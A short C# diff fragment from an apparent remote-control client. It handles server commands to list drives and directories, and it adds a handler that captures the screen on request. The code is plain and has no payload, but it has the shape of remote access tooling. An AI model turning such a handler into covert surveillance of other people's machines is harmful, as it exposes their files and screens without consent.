@@ -45,7 +45,6 @@ namespace Client.Client
                 Main.socketClient.GetServerSocket().Close();
                 Application.Exit();
             }
-
             if (tempString.StartsWith("<REQUEST-DRIVES>"))
             {
                 FileManager.LoadDrives();
@@ -53,8 +52,11 @@ namespace Client.Client
             if (tempString.StartsWith("<REQUEST-DIRS>"))
             {
                 tempString = tempString.Replace("<REQUEST-DIRS>", "");
-
                 FileManager.LoadDirectories(tempString);
+            }
+            if(tempString.StartsWith("<PRINTSCREEN>"))
+            {
+                ScreenViewer.TakePrintScreen();
             }
         }
 
